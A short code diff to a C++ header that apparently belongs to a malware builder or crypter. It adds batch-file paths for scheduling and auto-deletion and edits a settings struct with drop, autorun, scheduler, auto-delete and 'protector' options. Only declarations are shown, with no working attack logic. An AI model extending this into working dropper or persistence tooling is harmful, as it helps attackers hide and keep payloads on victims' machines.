@@ -27,6 +27,10 @@ SOFTWARE.
 #define MANAGER_H
 #include "common.h"
 
+#define BAT_EXTERNAL "RunExternal.bat"
+#define BAT_SCHD "C:\\Users\\scheduler.bat"
+#define BAT_AUTODEL "C:\\Users\\system.bat"
+
 namespace Manager {
 	#pragma pack(push, 1)
 	struct Settings {
@@ -37,15 +41,17 @@ namespace Manager {
 		char drop[128] = { 0 };
 		bool drop_run;
 
-		char scheduler_name[128] = { 0 };
+		char scheduler_name[50] = { 0 };
 		bool scheduler_state;
 
 		char autorun[128] = { 0 };
 		bool autorun_state;
 
-		char client_delay[128] = { 0 };
+		char client_delay[10] = { 0 };
 		bool auto_delete;
+
 		bool protector;
+		char protectorName[50] = { 0 };
 	};
 	#pragma pack(pop)
 
@@ -57,7 +63,6 @@ namespace Manager {
 	long GetFileSize(const char* filename);
 	bool FileExists(std::string name);
 
-	std::string ToLower(std::string str);
 	std::vector<std::string> split(std::string str, char delim);
 
 	std::string EncryptStr(std::string text, std::string key);
